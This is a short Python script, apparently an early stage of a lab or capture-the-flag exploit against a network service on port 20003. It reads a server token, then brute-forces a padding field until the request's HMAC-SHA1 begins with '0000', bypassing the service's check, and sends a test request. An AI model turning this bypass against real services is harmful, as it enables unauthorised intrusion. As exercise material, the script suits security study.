#!/usr/bin/python

from socket import *  
from struct import *  
import json  
from hashlib import sha1  
import hmac

s = socket(AF_INET, SOCK_STREAM)  
s.connect(("192.168.159.130", 20003))  
print("[+] Getting token")  
token = s.recv(1024)  
token = token.strip().strip('"')  
print("[+] Token: " + token)

test_request = '{ "title": "test", "contents": "test", "tags": ["test1", "test2"], "serverip": "127.0.0.1" }'  
print("[+] Test request: " + test_request)  
mac = hmac.new(token, token + "\n" + test_request, sha1).digest()  
print("[+] Test request MAC: " + mac.encode('hex'))  
print("[+] Modifying hash till it starts with 0000")

i = 0  
new_request = ""  
while True:  
        new_request = test_request[0:-1] + ', "padding": "' + str(i) + '"}'
        hexmac = hmac.new(token, token + "\n" + new_request, sha1).digest().encode("hex")
        if "0000" in hexmac[0:4]:
                break
        i += 1
print("[+] New request: " + new_request)  
print("[+] New MAC: " + hmac.new(token, token + "\n" + new_request, sha1).digest().encode("hex"))  
print("[+] Sending test request to server")  
s.send(token + "\n" + new_request)  
s.close()  